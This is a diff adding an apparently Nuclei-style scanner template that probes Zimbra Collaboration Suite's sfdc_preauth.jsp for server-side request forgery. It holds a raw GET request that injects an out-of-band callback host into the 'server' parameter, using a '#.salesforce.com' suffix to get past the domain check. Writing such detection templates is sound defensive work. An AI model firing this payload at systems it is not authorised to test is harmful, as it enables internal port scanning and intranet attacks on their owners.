@@ -1,0 +1,35 @@
+id: zimbra-ssrf-sfdc-preauth
+info:
+  name: Zimbra Collaboration Suite sfdc_preauth.jsp SSRF
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Zimbra Collaboration Suite (ZCS) contains a Server-Side Request Forgery (SSRF) vulnerability in the sfdc_preauth.jsp file. This vulnerability allows attackers to perform internal port scanning and other intranet attacks.
+  tags: ssrf
+  reference:
+    - https://fofa.so
+    - https://www.zimbra.com
+
+http:
+  - raw:
+      - |
+        GET /service/error/sfdc_preauth.jsp?session=s&userid=1&server={{interactsh-url}}%23.salesforce.com/ HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+    extractors:
+      - type: regex
+        group: 0
+        regex:
+          - "it is a blind ssrf.*"
